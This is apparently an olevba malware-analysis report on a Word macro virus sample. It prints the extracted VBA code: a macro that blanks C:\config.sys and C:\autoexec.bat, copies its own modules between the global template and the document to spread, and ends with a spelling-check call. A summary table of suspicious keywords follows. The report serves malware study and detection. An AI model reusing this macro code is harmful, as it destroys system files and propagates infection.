olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Uplamhand-a6d54bad33a5e8f465f327bcaba8bfcc90e90a22
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Uplamhand-a6d54bad33a5e8f465f327bcaba8bfcc90e90a22 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ÎPayLoad.bas 
in file: Virus.MSWord.Uplamhand-a6d54bad33a5e8f465f327bcaba8bfcc90e90a22 - OLE stream: 'Macros/VBA/ÎPayLoad'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    Rem That's enough to prove my point
End Sub
-------------------------------------------------------------------------------
VBA MACRO AAAÙÛÒ.bas 
in file: Virus.MSWord.Uplamhand-a6d54bad33a5e8f465f327bcaba8bfcc90e90a22 - OLE stream: 'Macros/VBA/AAAÙÛÒ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
'this becomes the ToolsSpelling for the global template

On Error GoTo -1: On Error GoTo Bail
Open "C:\config.sys" For Output As 1
Open "C:\autoexec.bat" For Output As 2
Write #1, ""
Write #2, ""

sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":DocClose"
WordBasic.MacroCopy "Global:AAAËÊÐ", sTMacro$
sTMacro$ = sMe$ + ":AAAËÊÐ"
WordBasic.MacroCopy "Global:AAAËÊÐ", sTMacro$
sTMacro$ = sMe$ + ":AAAÙÛÒ"
WordBasic.MacroCopy "Global:AAAÙÛÒ", sTMacro$
sTMacro$ = sMe$ + ":ÎPayLoad"
WordBasic.MacroCopy "Global:ÎPayLoad", sTMacro$
WordBasic.ToolsSpelling
GoTo Done

Bail:
    WordBasic.ToolsSpelling
Done:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

